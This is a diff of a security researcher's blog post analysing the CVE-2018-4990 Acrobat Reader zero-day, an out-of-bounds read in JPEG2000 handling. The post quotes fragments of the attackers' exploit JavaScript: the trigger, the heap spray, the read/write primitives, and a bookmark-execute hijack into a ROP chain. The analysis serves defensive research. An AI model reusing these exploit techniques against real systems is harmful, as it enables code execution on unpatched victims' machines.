@@ -3,40 +3,32 @@ layout: post
 title: "Adobe, Me and an Arbitrary Free :: Analyzing the CVE-2018-4990 Zero-Day Exploit"
 date: 2018-05-21 09:00:00 -0500
 categories: blog
-excerpt_separator: <!--more-->
 ---
 
-<img class="excel" alt="Acrobat Reader" src="/assets/images/reader.png">
-<p class="cn" markdown="1">
-**Update!** I originally titled this blog post 'Adobe, Me and a Double Free', however as a good friend of mine [Ke Liu](https://twitter.com/klotxl404/status/998777393262166017) of Tencent's Xuanwu LAB pointed out, this vulnerability is actually an out-of-bounds read that leads to two arbitrary free conditions. Therefore I have updated my analysis of the root cause as well as the exploitation.
-</p>
+![Acrobat Reader](/assets/images/adobe-me-and-an-arbitrary-free/reader.png "Acrobat Reader") 
 
-<p class="cn" markdown="1">
-I managed to get my hands on a sample of CVE-2018-4990. This was a zero-day exploit affecting Acrobat Reader that was recently patched by Adobe in [apsb18-09](https://helpx.adobe.com/security/products/acrobat/apsb18-09.html). [Anton Cherepanov](https://www.welivesecurity.com/author/acherepanov/) at ESET wrote a marketing blog post on it ([A tale of two zero-days](https://www.welivesecurity.com/2018/05/15/tale-two-zero-days/)) which was a ~~decent~~, pretty poor analysis and it was missing some important things for me, such as how was the bug actually exploited?</p>
+**Update!** I originally titled this blog post 'Adobe, Me and a Double Free', however as a good friend of mine [Ke Liu](https://twitter.com/klotxl404/status/998777393262166017) of Tencent's Xuanwu LAB pointed out, this vulnerability is actually an out-of-bounds read that leads to two arbitrary free conditions. Therefore I have updated my analysis of the root cause as well as the exploitation.
+
+I managed to get my hands on a sample of CVE-2018-4990. This was a zero-day exploit affecting Acrobat Reader that was recently patched by Adobe in [apsb18-09](https://helpx.adobe.com/security/products/acrobat/apsb18-09.html). [Anton Cherepanov](https://www.welivesecurity.com/author/acherepanov/) at ESET wrote a marketing blog post on it ([A tale of two zero-days](https://www.welivesecurity.com/2018/05/15/tale-two-zero-days/)) which was a ~~decent~~, pretty poor analysis and it was missing some important things for me, such as how was the bug actually exploited?
 <!--more-->
 
-<p class="cn">TL;DR</p>
-
-<p class="cn">I walk through how the attacker(s) exploited CVE-2018-4990 which is an out of bounds read in Acrobat Reader when processing specially crafted JPEG2000 images.</p>
+TL;DR; I walk through how the attacker(s) exploited CVE-2018-4990 which is an out of bounds read in Acrobat Reader when processing specially crafted JPEG2000 images.
 
 ### Introduction
 
-<p class="cn" markdown="1">It's uncommon to see Acrobat Reader exploits in the wild these days so I decided to take a look at this one. All testing was done AcroRd32.exe (c4c6f8680efeedafa4bb7a71d1a6f0cd37529ffc) v2018.011.20035. Other versions are also affected, please see Adobe's bulletin [apsb18-09](https://helpx.adobe.com/security/products/acrobat/apsb18-09.html) for more details.</p>
+It's uncommon to see Acrobat Reader exploits in the wild these days so I decided to take a look at this one. All testing was done AcroRd32.exe (c4c6f8680efeedafa4bb7a71d1a6f0cd37529ffc) v2018.011.20035. Other versions are also affected, please see Adobe's bulletin [apsb18-09](https://helpx.adobe.com/security/products/acrobat/apsb18-09.html) for more details.
 
 ### Getting to the root of the vulnerability
 
-<p class="cn" markdown="1">
-
-The first thing I needed to do was uncompress the PDF as many objects are compressed, hiding the true functionaility such as JavaScript and images. I like to use [pdf toolkit](https://www.pdflabs.com/tools/pdftk-the-pdf-toolkit/) since it's command line driven.</p>
+The first thing I needed to do was uncompress the PDF as many objects are compressed, hiding the true functionaility such as JavaScript and images. I like to use [pdf toolkit](https://www.pdflabs.com/tools/pdftk-the-pdf-toolkit/) since it's command line driven.
 
 `c:\> pdftk 4b672deae5c1231ea20ea70b0bf091164ef0b939e2cf4d142d31916a169e8e01 output poc.pdf uncompress`
 
-<p class="cn" markdown="1">
 Since I don't have an original sample of the JPEG2000 image, I have no idea if this image was bitflipped or not, so I am only going to dive into the JavaScript.
 
-After stripping away the rest of the JavaScript, we can see the following code will trigger the out of bounds read:</p>
+After stripping away the rest of the JavaScript, we can see the following code will trigger the out of bounds read:
 
-```JavaScript
+```js
 function trigger(){
     var f = this.getField("Button1");
     if(f){
@@ -45,8 +37,6 @@ function trigger(){
 }
 trigger();
 ```
-<p class="cn" markdown="1">
-
 
 The JavaScript comes from an OpenAction triggered from the root node</p>
 
@@ -95,7 +85,7 @@ trailer
 >>
 ```
 
-<p class="cn" markdown="1">With page heap and user-mode stack traces enabled, we get the following crash.</p>
+With page heap and user-mode stack traces enabled, we get the following crash.
 
 ```
 (a48.1538): Access violation - code c0000005 (first chance)
@@ -133,19 +123,15 @@ WARNING: Stack unwind information not available. Following frames may be wrong.
 0022a9d0 50dbd949 c0010000 0000000d 45c3aa50 AcroRd32_50be0000!PDMediaQueriesGetCosObj+0x76de1
 ```
 
-<p class="cn" markdown="1">We can see that the caller to free was JP2KLib!JP2KCopyRect+0xbae6, let's dive into that function to see what is happening.</p>
+We can see that the caller to free was `JP2KLib!JP2KCopyRect+0xbae6`, let's dive into that function to see what is happening.
 
-{% include image.html
-            img="assets/images/reader-df.png#1"
-            title="The location of the out of bounds read in sub_1004F3BD"
-            caption="The location of the out of bounds read in sub_1004F3BD"
-            style="width:50%;height:50%" %}
+![The location of the out of bounds read in sub_1004F3BD](/assets/images/adobe-me-and-an-arbitrary-free/reader-df.png "The location of the out of bounds read in sub_1004F3BD")
 
-<p class="cn" markdown="1">We can see that we are actually within a looped operation. The code is looping over an index which is used to read values out of a buffer. The buffer that its trying to read from is size 0x3f4. So if the index is 0xfd we have a read from buffer+(0xfd*0x4) == 0x3f4 which is the first dword out of bounds. Now if the loop continues for one last time (0xfe < 0xff) then we have a second out of bounds read of another dword. Therefore this bug reads 8 bytes out of bounds.</p>
+We can see that we are actually within a looped operation. The code is looping over an index which is used to read values out of a buffer. The buffer that its trying to read from is size 0x3f4. So if the index is 0xfd we have a read from buffer+(0xfd*0x4) == 0x3f4 which is the first dword out of bounds. Now if the loop continues for one last time (0xfe < 0xff) then we have a second out of bounds read of another dword. Therefore this bug reads 8 bytes out of bounds.
 
-<p class="cn" markdown="1">If the value that it reads is not null, then the code pushs the out of bounds value as the first argument to sub_10066FEA and calls it.</p>
+If the value that it reads is not null, then the code pushs the out of bounds value as the first argument to sub_10066FEA and calls it.
 
-<p class="cn" markdown="1">Were going to set a break point just before the caller on the `push eax` to check what is happening.</p>
+Were going to set a break point just before the caller on the `push eax` to check what is happening.
 
 ```
 Breakpoint 1 hit
@@ -162,30 +148,24 @@ JP2KLib!JP2KCopyRect+0xbae0:
 ecx=000000fd
 ```
 
-<p class="cn" markdown="1">We can clearly see that the upper bound is 0xff and the current index is 0xfd. I am unsure if this upper bound value is controllable, the `display.visible` constant is actually 0.</p>
+We can clearly see that the upper bound is 0xff and the current index is 0xfd. I am unsure if this upper bound value is controllable, the `display.visible` constant is actually 0.
+Depending on what sub_10066FEA does with the out of bounds value (eax), will actually determine the exploitability of this bug. But we already know already that it eventually tries to free the first argument. So essentially, this is an out of bounds read that leads to two arbitrary free's.
 
-<p class="cn" markdown="1">Depending on what sub_10066FEA does with the out of bounds value (eax), will actually determine the exploitability of this bug. But we already know already that it eventually tries to free the first argument. So essentially, this is an out of bounds read that leads to two arbitrary free's.</p>
-
-<p class="cn" markdown="1">
-An interesting sidenote is, that many vulnerabilities are triggered via malformed static content combined with dynamic content accessing and manipulating that malformed content. This type of fuzzing is harder since it requires combined, mutation and generation based fuzzing strategies in a single fuzz iteration.</p>
+An interesting sidenote is, that many vulnerabilities are triggered via malformed static content combined with dynamic content accessing and manipulating that malformed content. This type of fuzzing is harder since it requires combined, mutation and generation based fuzzing strategies in a single fuzz iteration.
 
 #### Exploitation
 
-<p class="cn" markdown="1">
 So in order to reach the arbitrary free's though, the attacker needs to perform the following:
-</p>
 
-<div markdown="1" class="cn">
 1. Load PDF, parse (presumably) a malformed JP2K image inside of a field button.
 2. Allocate a large amount of ArrayBuffer's that are just larger than the buffer that is read out of bounds
 3. Set the precise index (which is 249 and 250) with pointers to what the attackers want to free
 4. Free every second ArrayBuffer so that the allocation will land in a slot
 5. Trigger the bug which actually allocates into a slot and read out of bounds, freeing the two pointers
-</div>
 
-<p class="cn" markdown="1">This is what the JavaScript code looks like to so this:</p>
+This is what the JavaScript code looks like to so this:
 
-```JavaScript
+```js
 var a         = new Array(0x3000);
 var spraynum  = 0x1000;
 var sprayarr  = new Array(spraynum);
@@ -214,9 +194,9 @@ for(var i1 = 1; i1 < 0x3000; i1 = i1 + 2){
 }
 ```
 
-<p class="cn" markdown="1">Essentially what this code is doing to get the frees:</p>
+Essentially what this code is doing to get the frees:
 
-```JavaScript
+```
 1. Alloc TypedArray         2. Free TypedArray           3. Alloc from JP2KLib        4. OOB Read + free!
 +--------------------+      +---------------------+      +---------------------+      +---------------------+
 |                    |      |                     |      | +-----------------+ |      | +-----------------+ |
@@ -230,11 +210,11 @@ for(var i1 = 1; i1 < 0x3000; i1 = i1 + 2){
 Size: 0x400                 Size: 0x400                  Size: 0x400                  Size: 0x400
 ```
 
-<p class="cn" markdown="1">Size 252 is used because 252 * 4 is 0x3F0. Then if we add the header (0x10) the total is 0x400. This is just enough to allocate 8 bytes over the top of the target buffer to exploit the out of bounds read.</p>
+Size 252 is used because 252 * 4 is 0x3F0. Then if we add the header (0x10) the total is 0x400. This is just enough to allocate 8 bytes over the top of the target buffer to exploit the out of bounds read.
 
-<p class="cn" markdown="1">So the attackers free two buffers of size 0x10000 which gives them a nice use-after-free condition in JavaScript since they already have references to `sprayarr`. Since the buffers are sequential, coalescing occurs and the freed buffer becomes size 0x20000.</p>
+So the attackers free two buffers of size 0x10000 which gives them a nice use-after-free condition in JavaScript since they already have references to `sprayarr`. Since the buffers are sequential, coalescing occurs and the freed buffer becomes size 0x20000.
 
-<p class="cn" markdown="1">So after the two free's occur, we are left with the heap in this state.</p>
+So after the two free's occur, we are left with the heap in this state.
 
 ```
 1. Spray Heap                   2. Trigger arbitrary free       3. Trigger arbitrary free       4. Coalesce the 2 chunks
@@ -261,9 +241,9 @@ Size: 0x400                 Size: 0x400                  Size: 0x400            
 +------------------------+      +------------------------+      +------------------------+      +------------------------+
 ```
 
-<p class="cn" markdown="1">Now all the attackers need to do is allocate a TypedArray of size 0x20000 and using the `sprayarr` reference, find it to overwrite the next ArrayBuffer's byte length.</p>
+Now all the attackers need to do is allocate a TypedArray of size 0x20000 and using the `sprayarr` reference, find it to overwrite the next ArrayBuffer's byte length.
 
-```JavaScript
+```js
     // reclaims the memory, like your typical use after free
     for(var i1 = 1; i1 < 0x40; i1++){
         sprayarr2[i1] = new ArrayBuffer(0x20000-24);
@@ -288,11 +268,11 @@ Size: 0x400                 Size: 0x400                  Size: 0x400            
                 ...
 ```
 
-<p class="cn" markdown="1">Now that they know, which TypedArray has a large size (`if( sprayarr[i].byteLength == 0x20000-24)`), they use it to overwrite the byte length of the adjacent ArrayBuffer (`var biga = new DataView(sprayarr[i]); biga.setUint32(0x10000-12,0x66666666);`). Then they just check that the next ArrayBuffer has a matching byte length (`if(sprayarr[i+1].byteLength == 0x66666666)`) and if it does, then they have a relative read/write out of that adjacent ArrayBuffer using a DataView (`biga = new DataView(sprayarr[i+1]);`).</p>
+Now that they know, which TypedArray has a large size (`if( sprayarr[i].byteLength == 0x20000-24)`), they use it to overwrite the byte length of the adjacent ArrayBuffer (`var biga = new DataView(sprayarr[i]); biga.setUint32(0x10000-12,0x66666666);`). Then they just check that the next ArrayBuffer has a matching byte length (`if(sprayarr[i+1].byteLength == 0x66666666)`) and if it does, then they have a relative read/write out of that adjacent ArrayBuffer using a DataView (`biga = new DataView(sprayarr[i+1]);`).
 
-<p class="cn" markdown="1">At this stage, they need to upgrade this primitive to a full read/write primitive across the whole process space, so they leak a pointer and base address of a TypedArray.</p>
+At this stage, they need to upgrade this primitive to a full read/write primitive across the whole process space, so they leak a pointer and base address of a TypedArray.
 
-```
+```js
             var arr = new Array(0x10000);
             for(var i2 = 0x10; i2 < 0x10000; i2++)
                 arr[i2] = new Uint32Array(1);
@@ -329,9 +309,9 @@ Size: 0x400                 Size: 0x400                  Size: 0x400            
                     myarraybase = mydv.getUint32(mypos, true);
 ```
 
-<p class="cn" markdown="1">For the full read and write primitives, they overwrite the TypedArray pointer stored in the first element of the `arr` Array using `mypos` with the address they want to read/write from, do the read/write and then set the pointer to the TypedArray back to the base address `myarraybase`.</p>
+For the full read and write primitives, they overwrite the TypedArray pointer stored in the first element of the `arr` Array using `mypos` with the address they want to read/write from, do the read/write and then set the pointer to the TypedArray back to the base address `myarraybase`.
 
-```
+```js
 function myread(addr){
     mydv.setUint32(mypos, addr, true);
     var res = myarray[0];
@@ -345,9 +325,11 @@ function mywrite(addr, value){
     mydv.setUint32(mypos, myarraybase, true);
 }
 ```
-<p class="cn" markdown="1">Naturally, they use some helper functions to use the new read/write primitive. At this point it's game over. They could have gone with a data only attack but there is no need since Acrobat Reader has no Control Flow Guard (CFG) so they opted for the traditional call gate control flow. First they located the EScript.api and got the dll base address, then they built a rop chain with a dll loader stub, stored it all in the `myarray` TypedArray overwrote the bookmark object's execute function pointer with the base address of `myarray` to finally redirect execution flow.</p>
 
-```
+Naturally, they use some helper functions to use the new read/write primitive. At this point it's game over. They could have gone with a data only attack but there is no need since Acrobat Reader has no Control Flow Guard (CFG) so they opted for the traditional call gate control flow. 
+First they located the EScript.api and got the dll base address, then they built a rop chain with a dll loader stub, stored it all in the `myarray` TypedArray overwrote the bookmark object's execute function pointer with the base address of `myarray` to finally redirect execution flow.
+
+```js
 var bkm = this.bookmarkRoot;        
 var objescript = 0x23A59BA4 - 0x23800000 + dll_base;
 objescript = myread(objescript);
@@ -364,13 +346,11 @@ bkm.execute();
 
 ### Conclusion
 
-<p class="cn">Adobe Acrobat Reader is still a great target for attackers since JavaScript is so flexible with ArrayBuffers and PDF parsing is so complicated. OS mitigations have very little impact and it's up to Adobe to opt-in and harden it's binaries (/GUARD:CF) to make exploitation harder. Had Adobe enabled CFG and developed a form of isolated heap (like they did with flash) then this bug might have been much harder to exploit.</p>
-<p class="cn">As already mentioned, this sample looks like it was still in active development, no obfuscation was done on the JavaScript, but this is very much a throw away bug as I'm sure many other bugs exist in JP2KLib.dll. Nevertheless this was a fantastic bug and an even better exploit!</p>
+Adobe Acrobat Reader is still a great target for attackers since JavaScript is so flexible with ArrayBuffers and PDF parsing is so complicated. OS mitigations have very little impact and it's up to Adobe to opt-in and harden it's binaries (/GUARD:CF) to make exploitation harder. Had Adobe enabled CFG and developed a form of isolated heap (like they did with flash) then this bug might have been much harder to exploit.
+As already mentioned, this sample looks like it was still in active development, no obfuscation was done on the JavaScript, but this is very much a throw away bug as I'm sure many other bugs exist in JP2KLib.dll. Nevertheless this was a fantastic bug and an even better exploit!
 
 ### References
 
-<div markdown="1" class="cn">
 - [https://www.welivesecurity.com/2018/05/15/tale-two-zero-days/](https://www.welivesecurity.com/2018/05/15/tale-two-zero-days/)
 - [https://twitter.com/klotxl404/status/998777393262166017](https://twitter.com/klotxl404/status/998777393262166017)
 - [http://asciiflow.com/](http://asciiflow.com/)
-</div>
